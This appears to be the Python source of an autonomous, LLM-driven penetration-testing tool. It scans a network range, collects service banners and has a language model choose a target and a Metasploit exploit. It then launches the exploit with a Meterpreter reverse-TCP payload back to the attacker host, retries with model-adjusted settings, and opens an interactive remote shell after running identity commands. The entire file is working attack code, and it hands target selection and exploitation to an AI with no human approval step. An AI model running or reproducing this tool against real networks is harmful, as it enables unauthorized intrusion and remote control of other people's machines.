# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures
import argparse
import ipaddress

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ["ANONYMIZED_TELEMETRY"] = "False"

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine

# --- COLORS ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

LOOT_DIR = "/app/data/logs"
os.makedirs(LOOT_DIR, exist_ok=True)

class PentestMultiTarget:
    def __init__(self, network_cidr, attacker_ip, test_mode=False):
        self.network_cidr = network_cidr
        self.attacker_ip = attacker_ip
        self.test_mode = test_mode
        
        modo_exec = "MODO TESTE RAPIDO" if self.test_mode else "MODO FULL ENTERPRISE"
        print(f"=== INICIALIZANDO PIPELINE CACADOR (V18 - HUNTER & HEURISTIC) ===")
        print(f"[*] Rede Alvo CIDR: {self.network_cidr}") 
        print(f"[*] IP do Atacante (LHOST) Detectado: {self.attacker_ip}")
        print(f"[*] Logs serao salvos em: {LOOT_DIR}")
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    self.rag = RagEngine()
                finally:
                    sys.stderr = old_stderr
        except Exception as e:
            print(f"{C_RED}[CRITICO] Falha ao iniciar componentes: {e}{C_RESET}")
            sys.exit(1)
            
        self.session_id = None
        self.target_ip_escolhido = None
        self.history = []
        self.evidence = {}

    def ask_llm_robust(self, prompt, max_retries=3):
        for attempt in range(max_retries):
            try:
                resp = self.llm.ask(prompt, history=[]).replace("```json", "").replace("```", "").strip()
                if resp: return resp
            except Exception as e:
                time.sleep((attempt + 1) * 2)
        return None

    def is_host_alive(self, ip):
        """TCP Ping Sweep rapido para pular IPs inativos e evitar Blackhole Routing"""
        vital_ports = [21, 22, 23, 80, 111, 135, 139, 443, 445, 3389, 8080]
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(vital_ports)) as executor:
            futures = {executor.submit(self.check_port, ip, p): p for p in vital_ports}
            for future in concurrent.futures.as_completed(futures):
                if future.result(): return True
        return False

    def check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.4) 
            if sock.connect_ex((ip, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def get_service_banner(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, int(port)))
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return re.sub(r'[^\x20-\x7E]', '', banner)
            except socket.timeout: pass
            
            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                clean = re.sub(r'[^\x20-\x7E]', '', banner)
                return clean if clean else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    def resolve_module_name(self, bad_name):
        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
        search_terms = []
        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
        
        if "/" in base_name:
            search_terms.append(base_name.split("/")[-1])
        else:
            search_terms.append(base_name)

        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc', 'rdp']:
            if proto in base_name: search_terms.append(proto)

        for term in search_terms:
            try:
                res = self.msf.client.call('module.search', [term])
                if not res: continue
                
                candidates = []
                for mod in res:
                    m_name = mod.get('fullname')
                    if term not in m_name: continue
                    if "auxiliary/scanner" in m_name: candidates.append(m_name)
                    elif "exploit" in m_name and "exploit" in bad_name: candidates.append(m_name)

                if candidates:
                    if "version" in bad_name:
                        vers = [c for c in candidates if "version" in c]
                        if vers: return vers[0]
                    if "login" in bad_name:
                        logs = [c for c in candidates if "login" in c]
                        if logs: return logs[0]
                    if "backdoor" in bad_name:
                        bds = [c for c in candidates if "backdoor" in c]
                        if bds: return bds[0]

                    candidates.sort(key=len)
                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
                    return candidates[0]
            except: pass
        return None

    def generate_text_report(self):
        if not self.target_ip_escolhido: return
        now = datetime.datetime.now()
        safe_ip = self.target_ip_escolhido.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        
        lines = [
            "="*50, "RELATORIO FINAL (MULTI-TARGET HUNTER)", "="*50,
            f"DATA: {now}", f"ALVO ABATIDO: {self.target_ip_escolhido}", 
            f"STATUS: {'PWNED' if self.session_id else 'FALHA'}", "-"*50,
            "\n[HISTORICO DA CACADA]"
        ] + [f"- {h}" for h in self.history]
        
        if hasattr(self, 'evidence') and self.evidence.get("shell_info"):
             lines.append("\n[EVIDENCIAS]")
             lines.append(f"SHELL INFO: {self.evidence['shell_info']}")

        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
            print(f"\n{C_GREEN}{'='*60}")
            print(f" [LOG] RELATORIO DA CACADA SALVO: {filepath}")
            print(f"{'='*60}{C_RESET}\n")
        except: pass

    def enter_interactive_mode(self):
        if not self.session_id: return
        print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip_escolhido} > {C_RESET}")
                if cmd.lower() in ['exit', 'quit']:
                    print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                    break
                if not cmd.strip(): continue
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(1.5)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
            except: break

    def run(self):
        print(f"\n{C_MAGENTA}>>> [FASE 1] VARREDURA MASSIVA DA REDE (DISCOVERY){C_RESET}")
        
        try:
            network = ipaddress.IPv4Network(self.network_cidr, strict=False)
            all_ips = [str(ip) for ip in network.hosts()]
        except ValueError as e:
            print(f"{C_RED}[ERRO] CIDR invalido: {e}{C_RESET}")
            return

        if self.test_mode:
            print(f"{C_YELLOW}[!] MODO TESTE: Limitando a varredura aos 5 primeiros IPs da faixa.{C_RESET}")
            target_ips = all_ips[:5]
            ports_to_scan = [21, 22, 23, 25, 80, 111, 139, 443, 445, 8080]
        else:
            target_ips = all_ips
            # Escopo gigante: portas 1 a 6000 + 20000 a 30000
            ports_to_scan = list(range(1, 6000)) + list(range(20000, 30000))
            print(f"{C_YELLOW}[AVISO] Escaneando {len(target_ips)} hosts e {len(ports_to_scan)} portas por host.{C_RESET}")

        network_map = {}
        
        for ip in target_ips:
            if ip == self.attacker_ip:
                continue
            
            print(f"{C_YELLOW}[*] Triagem rapida: Verificando se {ip} esta ativo...{C_RESET}", end='\r')
            if not self.is_host_alive(ip):
                continue
                
            print(f"                                                              ", end='\r')
            print(f"{C_CYAN}[+] ALVO VIVO DETECTADO: {ip}. Iniciando varredura profunda...{C_RESET}")
            
            open_ports = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                futures = {executor.submit(self.check_port, ip, p): p for p in ports_to_scan}
                for future in concurrent.futures.as_completed(futures):
                    p = future.result()
                    if p: open_ports.append(p)
            
            if open_ports:
                network_map[ip] = {}
                print(f"{C_YELLOW}[*] {ip} -> {len(open_ports)} portas abertas.{C_RESET}")
                for p in sorted(open_ports):
                    banner = self.get_service_banner(ip, p)
                    network_map[ip][str(p)] = banner
                    print(f"    {C_GREEN}[+] Porta {p}: {banner[:30]}...{C_RESET}")

        if not network_map:
            print(f"{C_RED}[!] Nenhum servico ativo encontrado no escopo {self.network_cidr}.{C_RESET}")
            return

        print(f"\n{C_MAGENTA}>>> [FASE 2] TRIAGEM AUTONOMA DE ALVOS (RAG HEURISTIC){C_RESET}")
        
        rag_context = ""
        try:
            query = "INTERNAL RED TEAM DOCUMENTATION TARGET PRIORITIZATION POLICY"
            docs = self.rag.query(query)
            if docs: 
                rag_context = "\n".join([d.page_content for d in docs[:3]])
                print(f"\n{C_CYAN}=== [RAG DEBUG] POLITICA DE PRIORIZACAO RECUPERADA ==={C_RESET}")
                print(f"{C_CYAN}{rag_context}{C_RESET}")
                print(f"{C_CYAN}====================================================={C_RESET}\n")
        except: pass

        map_json = json.dumps(network_map, indent=2)

        prompt = f"""
        YOU ARE THE LEAD STRATEGIST OF AN AUTONOMOUS PENTESTING TOOL.
        YOUR MISSION IS TO ANALYZE THE ENTIRE NETWORK MAP AND SELECT THE SINGLE MOST CRITICAL TARGET TO ATTACK FIRST.

        ----------------------------------------
        NETWORK MAP (DISCOVERED TARGETS):
        ----------------------------------------
        {map_json}
        
        ----------------------------------------
        ORGANIZATIONAL PRIORITIZATION POLICY (RAG):
        ----------------------------------------
        {rag_context}
        
        ----------------------------------------
        TASK:
        1. Analyze all IPs and their service banners.
        2. Apply the Prioritization Policy from the RAG strictly.
        3. Select the IP and Port that represents the highest critical value according to the Policy.
        4. Define the precise Metasploit exploit and options. (Use LHOST: {self.attacker_ip} and LPORT: 4444).
        
        OUTPUT FORMAT (JSON ONLY):
        {{
          "target_ip": "IP_TO_ATTACK",
          "target_port": "PORT_TO_ATTACK",
          "module_type": "exploit",
          "module_name": "category/service/module_name",
          "strategy": "exploit_cve",
          "options": {{"OPT_NAME": "OPT_VALUE"}},
          "reasoning": "Explain WHY you chose this IP over the others based on the Policy."
        }}
        """

        print(f"{C_YELLOW}[*] Injetando Mapa da Rede na IA para decisao de abate...{C_RESET}")
        resp = self.ask_llm_robust(prompt)
        
        plan = {}
        if resp:
            try: 
                plan = json.loads(resp[resp.find("{"):resp.rfind("}")+1])
            except: pass

        t_ip = plan.get('target_ip')
        t_port = plan.get('target_port')
        self.target_ip_escolhido = t_ip
        
        module = plan.get('module_name', '').strip()
        strategy = plan.get('strategy', 'skip').lower()
        reason = plan.get('reasoning', 'Nenhuma justificativa fornecida.')
        llm_opts = plan.get('options', {})

        if not t_ip or not module:
            print(f"{C_RED}[FALHA] A IA nao conseguiu determinar um alvo viavel.{C_RESET}")
            return

        print(f"\n{C_BLUE}[AI STRATEGIST] DECISAO DE ENGAJAMENTO:{C_RESET}")
        print(f"{C_BLUE} > ALVO ESCOLHIDO: {t_ip}:{t_port}{C_RESET}")
        print(f"{C_BLUE} > MODULO APLICADO: {module}{C_RESET}")
        print(f"{C_BOLD}{C_BLUE} > JUSTIFICATIVA LOGICA: {reason}{C_RESET}\n")

        # --- BLINDAGEM DO PARSER (Anti-Alucinacao de String) ---
        clean_name = module.replace("exploit/", "").replace("auxiliary/", "").strip("/")
        if not self.msf.verify_module_exists("auxiliary", clean_name) and \
           not self.msf.verify_module_exists("exploit", clean_name):
            fixed = self.resolve_module_name(clean_name)
            if fixed: 
                clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
                if "login" in fixed: strategy = "brute_force"
            else:
                print(f"{C_RED}[ERRO] Modulo '{clean_name}' invalido ou inexistente.{C_RESET}")
                return

        m_type = "exploit" if strategy == "exploit_cve" else "auxiliary"
        m_name = clean_name

        opts = {"RHOSTS": t_ip, "RPORT": int(t_port)}
        opts.update(llm_opts)
        
        print(f"\n{C_MAGENTA}>>> [FASE 3] EXECUTANDO ATAQUE CIRURGICO NO ALVO PRINCIPAL{C_RESET}")
        
        if strategy == "exploit_cve":
            print(f"{C_YELLOW}[*] Iniciando cadeia de Exploit (com Auto-Retry AI)...{C_RESET}")
            
            max_attempts = 3
            for attempt in range(1, max_attempts + 1):
                opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                
                print(f"\n{C_YELLOW}[DEBUG] Tentativa {attempt}/{max_attempts} - Executando {m_type}/{m_name}{C_RESET}")
                print(f"{C_YELLOW}[DEBUG] Opcoes injetadas pela IA: {opts}{C_RESET}")
                
                self.msf.run_module(m_type, m_name, opts)
                print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
                time.sleep(20) 
                
                sessions = self.msf.client.call('session.list') or {}
                if sessions:
                    sid = str(max([int(k) for k in sessions.keys()]))
                    if sid != self.session_id:
                        print(f"{C_GREEN}[***] SUCESSO ABSOLUTO! Exploit funcionou (Sessao {sid}){C_RESET}")
                        self.session_id = sid
                        self.history.append(f"[SUCESSO] Sessao aberta no alvo {t_ip}:{t_port}")
                        break 
                
                print(f"{C_RED}[FALHA] Nenhuma sessao obtida na tentativa {attempt}.{C_RESET}")
                self.history.append(f"[FALHA] Tentativa {attempt} com as opcoes: {opts}")
                
                # Feedback Loop de Auto-Correcao
                if attempt < max_attempts:
                    print(f"{C_YELLOW}[*] Consultando a IA Estrategista para recalcular os parametros...{C_RESET}")
                    retry_prompt = f"""
                    The exploit '{m_name}' failed to create a session on {t_ip}.
                    The options previously used were: {opts}
                    
                    CRITICAL INSTRUCTION FOR KERNEL EXPLOITS:
                    The failure is almost certainly due to an incorrect 'TARGET' ID. 
                    You MUST change the 'TARGET' value to a DIFFERENT number. 
                    For example, if you used 3, you MUST now try 1 (VMware) or 2 (Hyper-V). 
                    DO NOT USE THE SAME 'TARGET' VALUE AGAIN. 
                    DO NOT change the PAYLOAD, keep it as 'windows/x64/meterpreter/reverse_tcp' to ensure stability.
                    
                    Provide a revised set of options to try again. 
                    If you believe the exploit is completely unviable and we should give up, set strategy to 'skip'.
                    
                    OUTPUT FORMAT (JSON ONLY):
                    {{
                      "strategy": "exploit_cve",
                      "options": {{"OPT_NAME": "NEW_OPT_VALUE"}},
                      "reason": "Explain exactly what TARGET you changed to."
                    }}
                    """
                    resp = self.ask_llm_robust(retry_prompt)
                    if resp:
                        try:
                            if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                            new_plan = json.loads(resp)
                            
                            if new_plan.get("strategy", "").lower() == "skip":
                                print(f"{C_RED}[AI] Decidiu abortar as tentativas: {new_plan.get('reason')}{C_RESET}")
                                break
                            
                            new_opts = new_plan.get("options", {})
                            opts.update(new_opts) 
                            print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan.get('reason', 'Parametros ajustados.')}{C_RESET}")
                        except Exception as e:
                            print(f"{C_RED}[ERRO AI] Falha ao processar reajuste.{C_RESET}")
            
            if not self.session_id:
                print(f"{C_RED}[FALHA GERAL] Todas as tentativas de exploit falharam.{C_RESET}")

        elif strategy == "enumeration":
            print(f"{C_YELLOW}[*] Disparando Scanner no alvo escolhido...{C_RESET}")
            self.msf.run_module(m_type, m_name, opts)
            time.sleep(4)

        # Fase 4: Post-Exploration e Relatorio
        if self.session_id:
            print(f"\n>>> [FASE 4] POST-EXPLORACAO")
            try:
                self.msf.client.call('session.shell_write', [self.session_id, "id; whoami; hostname\n"])
                time.sleep(3)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
                self.evidence["shell_info"] = str(res['data'])
            except: pass
            
        self.generate_text_report()

def get_best_route_ip(target_cidr):
    try:
        network = ipaddress.IPv4Network(target_cidr, strict=False)
        dummy_target = str(next(network.hosts())) 
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((dummy_target, 1)) 
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pipeline Cacador Autonomo Ragsploit (Enterprise Hunter)")
    parser.add_argument("--network", type=str, default="192.168.70.0/24", help="Rede alvo em notacao CIDR (ex: 10.19.0.0/21)")
    parser.add_argument("--lhost", type=str, default=None, help="Forca um IP de atacante (Se vazio, faz auto-discovery)")
    parser.add_argument("--test", action="store_true", help="Ativa o modo de testes rapidos")
    args = parser.parse_args()

    attacker_ip = args.lhost
    if not attacker_ip:
        attacker_ip = get_best_route_ip(args.network)
        if not attacker_ip:
            attacker_ip = "192.168.70.20" 

    p = PentestMultiTarget(network_cidr=args.network, attacker_ip=attacker_ip, test_mode=args.test)
    
    try:
        p.run()
        if p.session_id:
            p.enter_interactive_mode()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Interrupcao pelo usuario. Encerrando a cacada...{C_RESET}")
        p.generate_text_report()